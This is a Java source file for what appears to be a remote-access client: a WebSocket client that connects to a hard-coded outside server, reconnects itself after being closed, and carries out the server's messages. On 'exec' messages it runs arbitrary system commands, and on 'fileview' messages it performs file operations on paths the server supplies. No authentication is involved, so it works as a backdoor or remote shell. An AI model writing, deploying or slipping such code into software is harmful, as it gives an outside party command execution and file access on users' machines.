package Classes;

import Classes.Instructions.FileViewer;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.ByteBuffer;
import java.util.HashMap;

import com.google.gson.Gson;

public class Connection extends WebSocketClient {
    Gson json = new Gson();

    public Connection(URI serverURI) {
        super(serverURI);
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        try {
            Initialize init = new Initialize(this);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        System.out.println("Closed with exit code " + code + " additional info: " + reason);
        System.out.println("Trying to establish new connection in 5s");

        Connection connection = null;
        try {
            Thread.sleep(10000);

            connection = new Connection( new URI( "wss://zillo.gravbrot.it" ) );
        } catch (URISyntaxException | InterruptedException e) {
            e.printStackTrace();
        }
        connection.connect();
    }

    @Override
    public void onMessage(String message) {
        System.out.println("Received message: " + message);

        HashMap<String, String> command = json.fromJson(message, HashMap.class);

        String type = command.get("type");
        String from = command.get("from");

        if (type.equals("fileview")) {
            String path = command.get("value");
            String todo = command.get("todo");

            FileViewer fview = new FileViewer(this, path);
            try {
                fview.execute(todo, from);
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else if (type.equals("exec")) {
            String exec = command.get("value");

            System.out.println("Running command " + exec);

            Runtime runtime = Runtime.getRuntime();
            try {
                Process proc = runtime.exec(exec);
            } catch (IOException e) {
                e.printStackTrace();
            }

//            HashMap<String, String> information = new HashMap<String, String>();
//            information.put("type", "reply");
//            information.put("to", from);
//            information.put("value", "du er ballamann");
//
//            String toSend = json.toJson(information);
//
//            this.send(toSend);
        }
    }

    @Override
    public void onMessage(ByteBuffer message) {
        System.out.println("Received ByteBuffer");
    }

    @Override
    public void onError(Exception ex) {
        System.err.println("An error occurred:" + ex);
    }
}